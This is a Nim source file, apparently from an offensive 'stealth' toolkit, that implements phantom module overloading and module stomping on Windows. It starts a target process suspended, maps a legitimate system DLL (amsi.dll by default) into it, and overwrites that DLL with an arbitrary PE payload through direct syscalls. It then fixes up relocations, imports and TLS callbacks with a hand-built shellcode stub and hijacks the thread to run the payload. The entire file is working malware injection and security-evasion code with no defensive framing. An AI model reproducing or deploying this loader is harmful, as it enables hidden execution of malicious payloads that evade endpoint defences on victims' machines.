import winim
import ../core/resolver, ../core/syscalls, ../core/utils, strutils


proc to_offset(rva: uint32, nt: ptr IMAGE_NT_HEADERS64): uint32 =
    let sectionHeaderAddr = cast[uint](addr nt.OptionalHeader) + nt.FileHeader.SizeOfOptionalHeader.uint
    let pSections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sectionHeaderAddr)
    for i in 0..<nt.FileHeader.NumberOfSections.int:
        let pSec = pSections[i]
        let vAddr = pSec.VirtualAddress.uint32
        let vSize = pSec.Misc.VirtualSize.uint32
        if rva >= vAddr and rva < (vAddr + vSize):
            return rva - vAddr + pSec.PointerToRawData.uint32
    return rva

proc phantom_overloading*(payload_bytes: seq[byte], target_path: string, sacrifice_dll: string = "C:\\Windows\\System32\\amsi.dll"): HANDLE =
    log_debug("[Phantom] Starting Phantom Module Overloading (Direct Syscalls)...")
    log_debug("[Phantom] Target Process: " & target_path)
    log_debug("[Phantom] Sacrifice DLL: " & sacrifice_dll)

    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    si.cb = sizeof(si).DWORD

    # 1. Create Target Process (Suspended)
    if CreateProcessA(target_path, nil, nil, nil, FALSE, CREATE_SUSPENDED, nil, nil, addr si, addr pi) == 0:
        log_debug("[Phantom] CreateProcessA failed: " & $GetLastError())
        return 0

    # 2. Open Sacrifice DLL (using CreateFileW for stability)
    let wPath = newWideCString(sacrifice_dll)
    var hFile = CreateFileW(wPath, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
    if hFile == INVALID_HANDLE_VALUE:
        log_debug("[Phantom] CreateFileW failed: " & $GetLastError())
        TerminateProcess(pi.hProcess, 0); return 0

    # 3. Create Image Section from legitimate DLL
    var hSection: HANDLE
    var status = syscalls.NtCreateSection(addr hSection, SECTION_ALL_ACCESS, nil, nil, PAGE_READONLY, SEC_IMAGE, hFile)
    CloseHandle(hFile) # File handle no longer needed
    if status != 0:
        log_debug("[Phantom] NtCreateSection failed: 0x" & cast[uint32](status).toHex())
        TerminateProcess(pi.hProcess, 0); return 0

    # 4. Map Section into Target Process
    var remoteBase: pointer = nil
    var viewSize: SIZE_T = 0
    status = syscalls.NtMapViewOfSection(hSection, pi.hProcess, addr remoteBase, 0, 0, nil, addr viewSize, 1, 0, PAGE_READONLY)
    if status != 0:
        log_debug("[Phantom] NtMapViewOfSection failed: 0x" & cast[uint32](status).toHex())
        CloseHandle(hSection); TerminateProcess(pi.hProcess, 0); return 0

    log_debug("[Phantom] Sacrifice DLL mapped at: 0x" & cast[uint](remoteBase).toHex())

    # 5. Parse Payload
    let pPayload = unsafeAddr payload_bytes[0]
    let pDos = cast[ptr IMAGE_DOS_HEADER](pPayload)
    let pNt = cast[ptr IMAGE_NT_HEADERS64](cast[uint](pPayload) + pDos.e_lfanew.uint)
    let payloadSize = pNt.OptionalHeader.SizeOfImage

    # 6. Locate .text section in the sacrifice DLL for stomping
    # We need to read the headers from the REMOTELY mapped image
    var remoteDos: IMAGE_DOS_HEADER
    discard NtReadVirtualMemory(pi.hProcess, remoteBase, addr remoteDos, sizeof(remoteDos).SIZE_T, nil)
    var remoteNt: IMAGE_NT_HEADERS64
    discard NtReadVirtualMemory(pi.hProcess, cast[pointer](cast[uint](remoteBase) + remoteDos.e_lfanew.uint), addr remoteNt, sizeof(remoteNt).SIZE_T, nil)

    # Check if sacrifice DLL is large enough
    if remoteNt.OptionalHeader.SizeOfImage < payloadSize:
        log_debug("[Phantom] Sacrifice DLL too small: " & $remoteNt.OptionalHeader.SizeOfImage & " < " & $payloadSize)
        CloseHandle(hSection); TerminateProcess(pi.hProcess, 0); return 0

    # 7. Protect and Overwrite
    # For simplicity, we overwrite from the base. In advanced stomping, we find the largest section.
    # Let's just Overwrite the whole image area.
    var oldProt: ULONG
    var protAddr = remoteBase
    var protSize = payloadSize.SIZE_T
    status = syscalls.NtProtectVirtualMemory(pi.hProcess, addr protAddr, addr protSize, PAGE_READWRITE, addr oldProt)
    if status != 0:
        log_debug("[Phantom] NtProtectVirtualMemory failed: 0x" & cast[uint32](status).toHex())
        CloseHandle(hSection); TerminateProcess(pi.hProcess, 0); return 0

    # Write Headers
    discard syscalls.NtWriteVirtualMemory(pi.hProcess, remoteBase, pPayload, pNt.OptionalHeader.SizeOfHeaders.SIZE_T, nil)

    # Write Sections
    let sectionHeaderAddr = cast[uint](addr pNt.OptionalHeader) + pNt.FileHeader.SizeOfOptionalHeader.uint
    let pSections = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sectionHeaderAddr)
    for i in 0..<pNt.FileHeader.NumberOfSections.int:
        let pSec = pSections[i]
        if pSec.SizeOfRawData > 0:
            let pSrc = cast[pointer](cast[uint](pPayload) + pSec.PointerToRawData.uint)
            let pDst = cast[pointer](cast[uint](remoteBase) + pSec.VirtualAddress.uint)
            discard syscalls.NtWriteVirtualMemory(pi.hProcess, pDst, pSrc, pSec.SizeOfRawData.SIZE_T, nil)

    # 8. Relocations & IAT Resolution (Same logic as Hollowing)
    let delta = cast[int64](remoteBase) - cast[int64](pNt.OptionalHeader.ImageBase)
    if delta != 0:
        let relocDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
        if relocDir.VirtualAddress > 0:
            var currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](pPayload) + to_offset(relocDir.VirtualAddress.uint32, pNt).uint)
            let relocEnd = cast[uint](currentReloc) + relocDir.Size.uint
            while cast[uint](currentReloc) < relocEnd and currentReloc.SizeOfBlock > 0:
                let count = (currentReloc.SizeOfBlock.uint32 - sizeof(IMAGE_BASE_RELOCATION).uint32) div 2
                let pEntries = cast[ptr UncheckedArray[uint16]](cast[uint](currentReloc) + sizeof(IMAGE_BASE_RELOCATION).uint)
                for k in 0..<count.int:
                    let entry = pEntries[k]
                    if (entry shr 12) == IMAGE_REL_BASED_DIR64:
                        let patchAddr = cast[pointer](cast[uint](remoteBase) + currentReloc.VirtualAddress.uint + (entry and 0xFFF).uint)
                        var val: uint64
                        discard syscalls.NtReadVirtualMemory(pi.hProcess, patchAddr, addr val, sizeof(val), nil)
                        val += cast[uint64](delta)
                        discard syscalls.NtWriteVirtualMemory(pi.hProcess, patchAddr, addr val, sizeof(val), nil)
                currentReloc = cast[ptr IMAGE_BASE_RELOCATION](cast[uint](currentReloc) + currentReloc.SizeOfBlock.uint)

    # IAT Resolution
    let importDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
    if importDir.VirtualAddress > 0:
        type HID = object # Hollowing Import Descriptor
            OT, TS, FC, Name, FT: uint32
        var pID = cast[ptr HID](cast[uint](pPayload) + to_offset(importDir.VirtualAddress.uint32, pNt).uint)
        while pID.Name != 0:
            let dll = LoadLibraryA($cast[cstring](cast[uint](pPayload) + to_offset(pID.Name, pNt).uint))
            if dll != 0:
                var thunkRva = pID.FT
                var oftRva = if pID.OT != 0: pID.OT else: pID.FT
                
                var i = 0
                while true:
                    let pOriginalThunk = cast[ptr uint64](cast[uint](pPayload) + to_offset(oftRva + cast[uint32](i * 8), pNt).uint)
                    if pOriginalThunk[] == 0: break
                    
                    let rva = pOriginalThunk[]
                    var fAddr: uint64
                    if (rva and 0x8000000000000000.uint64) != 0:
                        fAddr = cast[uint64](GetProcAddress(dll, cast[cstring](rva and 0xFFFF)))
                    else:
                        let pN = cast[ptr IMAGE_IMPORT_BY_NAME](cast[uint](pPayload) + to_offset(rva.uint32, pNt).uint)
                        fAddr = cast[uint64](GetProcAddress(dll, cast[cstring](addr pN.Name)))
                    
                    if fAddr != 0:
                        let remoteThunkAddr = cast[pointer](cast[uint](remoteBase) + thunkRva.uint + cast[uint](i * 8))
                        discard syscalls.NtWriteVirtualMemory(pi.hProcess, remoteThunkAddr, addr fAddr, sizeof(fAddr), nil)
                    i.inc()

            pID = cast[ptr HID](cast[uint](pID) + sizeof(HID).uint)

    # Finalize Memory Protections (Section-based)
    log_debug("[Phantom] Finalizing memory protections...")
    
    # Helper function for section protection
    proc get_section_protection(characteristics: uint32): uint32 =
        let executable = (characteristics and 0x20000000'u32) != 0  # IMAGE_SCN_MEM_EXECUTE
        let readable = (characteristics and 0x40000000'u32) != 0    # IMAGE_SCN_MEM_READ
        let writeable = (characteristics and 0x80000000'u32) != 0   # IMAGE_SCN_MEM_WRITE
        
        if executable:
            if readable:
                if writeable: return PAGE_EXECUTE_READWRITE
                else: return PAGE_EXECUTE_READ
            else:
                if writeable: return PAGE_EXECUTE_READ # Fallback
        else:
            if readable:
                if writeable: return PAGE_READWRITE
                else: return PAGE_READONLY
            else:
                if writeable: return PAGE_READWRITE # Fallback
        return PAGE_EXECUTE_READWRITE # Safe fallback for injected pe
    
    # 1. Protect PE Headers as read-only
    var hAddr = remoteBase
    var hSize = pNt.OptionalHeader.SizeOfHeaders.SIZE_T
    var hOld: ULONG
    discard syscalls.NtProtectVirtualMemory(pi.hProcess, addr hAddr, addr hSize, PAGE_READONLY, addr hOld)
    log_debug("[Phantom]   Headers set to PAGE_READONLY")
    
    # 2. Protect each section based on characteristics
    let sec2HeaderAddr = cast[uint](addr pNt.OptionalHeader) + pNt.FileHeader.SizeOfOptionalHeader.uint
    let pSections2 = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](sec2HeaderAddr)
    for i in 0..<pNt.FileHeader.NumberOfSections.int:
        let pSec = pSections2[i]
        var pDst = cast[pointer](cast[uint](remoteBase) + pSec.VirtualAddress.uint)
        var vSize = pSec.Misc.VirtualSize.SIZE_T
        let charas = pSec.Characteristics.uint32
        let prot = get_section_protection(charas)
        var old: ULONG
        discard syscalls.NtProtectVirtualMemory(pi.hProcess, addr pDst, addr vSize, prot.ULONG, addr old)
        log_debug("[Phantom]   Section " & $i & " -> Protection: 0x" & prot.toHex())

    # Update PEB ImageBase
    log_debug("[Phantom] Updating PEB ImageBase...")
    var remotePeb: pointer
    var pbi: PROCESS_BASIC_INFORMATION
    var retLen: ULONG
    if syscalls.NtQueryInformationProcess(pi.hProcess, 0, addr pbi, sizeof(pbi).ULONG, addr retLen) == 0:
        remotePeb = pbi.PebBaseAddress
        log_debug("[Phantom] Remote PEB: 0x" & cast[uint](remotePeb).toHex())
        # PEB + 0x10 = ImageBaseAddress
        discard syscalls.NtWriteVirtualMemory(pi.hProcess, cast[pointer](cast[uint](remotePeb) + 0x10), addr remoteBase, sizeof(pointer), nil)
        log_debug("[Phantom] PEB ImageBase updated to: 0x" & cast[uint](remoteBase).toHex())

    # 9. --- TLS Callbacks & Entry Point ---
    var ctx: CONTEXT
    ctx.ContextFlags = CONTEXT_FULL
    discard syscalls.NtGetContextThread(pi.hThread, addr ctx)
    log_debug("[Phantom] Original RIP: 0x" & cast[uint](ctx.Rip).toHex() & " RCX: 0x" & cast[uint](ctx.Rcx).toHex())
    
    let tlsDir = pNt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
    if tlsDir.VirtualAddress > 0:
        log_debug("[Phantom] TLS Directory found. Building startup stub...")
        let pTls = cast[ptr IMAGE_TLS_DIRECTORY64](cast[uint](pPayload) + to_offset(cast[uint32](tlsDir.VirtualAddress), pNt).uint)
        
        if pTls.AddressOfCallBacks != 0:
            let preferredBase = pNt.OptionalHeader.ImageBase
            let callbacksRva = cast[uint32](pTls.AddressOfCallBacks.uint64 - preferredBase.uint64)
            
            var callbacks: seq[pointer]
            var remoteCallbacksPtr = cast[pointer](cast[uint](remoteBase) + callbacksRva.uint)
            var currentCallbackVA: uint64
            
            while true:
                if NtReadVirtualMemory(pi.hProcess, remoteCallbacksPtr, addr currentCallbackVA, sizeof(currentCallbackVA), nil) != 0 or currentCallbackVA == 0:
                    break
                let cbRva = cast[uint32](currentCallbackVA.uint64 - preferredBase.uint64)
                let remoteCbAddr = cast[pointer](cast[uint](remoteBase) + cbRva.uint)
                callbacks.add(remoteCbAddr)
                remoteCallbacksPtr = cast[pointer](cast[uint](remoteCallbacksPtr) + 8)
            
            # --- Initialize TLS Index ---
            if pTls.AddressOfIndex != 0:
                let indexRva = cast[uint32](pTls.AddressOfIndex.uint64 - preferredBase.uint64)
                var tlsIndex: uint32 = 0
                discard NtWriteVirtualMemory(pi.hProcess, cast[pointer](cast[uint](remoteBase) + indexRva.uint), addr tlsIndex, sizeof(tlsIndex), nil)

            if callbacks.len > 0:
                var stub: seq[byte] = @[]
                stub.add(@[0x55.byte])                           # push rbp
                stub.add(@[0x48.byte, 0x89, 0xE5])               # mov rbp, rsp
                stub.add(@[0x48.byte, 0x83, 0xEC, 0x30])         # sub rsp, 30h
                
                for i, cb in callbacks:
                    stub.add(@[0x48.byte, 0xB9])
                    let baseVal = cast[uint64](remoteBase)
                    for j in 0..7: stub.add(cast[byte]((baseVal shr (j * 8)) and 0xFF))
                    stub.add(@[0xBA.byte, 0x01, 0x00, 0x00, 0x00])
                    stub.add(@[0x45.byte, 0x31, 0xC0])
                    stub.add(@[0x48.byte, 0xB8])
                    let cbVal = cast[uint64](cb)
                    for j in 0..7: stub.add(cast[byte]((cbVal shr (j * 8)) and 0xFF))
                    stub.add(@[0xFF.byte, 0xD0])
                
                stub.add(@[0x48.byte, 0x89, 0xEC])               # mov rsp, rbp
                stub.add(@[0x5D.byte])                           # pop rbp
                stub.add(@[0x48.byte, 0xB8])
                let entryAddr = cast[uint64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
                for j in 0..7: stub.add(cast[byte]((entryAddr shr (j * 8)) and 0xFF))
                stub.add(@[0xFF.byte, 0xE0])
                
                # Instead of RIP, we overwrite RCX with the allocated stub.
                # When thread initiates execution, RtlUserThreadStart checks RCX.
                var remoteStub: pointer = nil
                var stubSize = stub.len.SIZE_T
                if NtAllocateVirtualMemory(pi.hProcess, addr remoteStub, 0, addr stubSize, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE) == 0:
                    if StealthWrite(pi.hProcess, remoteStub, addr stub[0], stub.len):
                        ctx.Rcx = cast[int64](remoteStub)
                    else:
                        ctx.Rcx = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
                else:
                    ctx.Rcx = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
            else:
                ctx.Rcx = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
        else:
            ctx.Rcx = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)
    else:
        ctx.Rcx = cast[int64](cast[uint](remoteBase) + pNt.OptionalHeader.AddressOfEntryPoint.uint)

    log_debug("[Phantom] Final RCX set to: 0x" & cast[uint](ctx.Rcx).toHex())
    if syscalls.NtSetContextThread(pi.hThread, addr ctx) != 0:
        log_debug("[Phantom] Failed to set context")
        CloseHandle(hSection); TerminateProcess(pi.hProcess, 0); return 0

    # Clean up
    CloseHandle(hSection)
    if ResumeThread(pi.hThread) == cast[DWORD](-1):
        log_debug("[Phantom] Failed to resume: " & $GetLastError())
        TerminateProcess(pi.hProcess, 0); return 0
    log_debug("[Phantom] ??SUCCESS. Module Overloaded via Direct Syscalls.")
    return pi.hProcess

proc module_stomping*(payload_bytes: seq[byte], target_path: string, sacrifice_dll: string = "C:\\Windows\\System32\\shell32.dll"): HANDLE =
    # Just a wrapper to satisfy libstealth export
    return phantom_overloading(payload_bytes, target_path, sacrifice_dll)
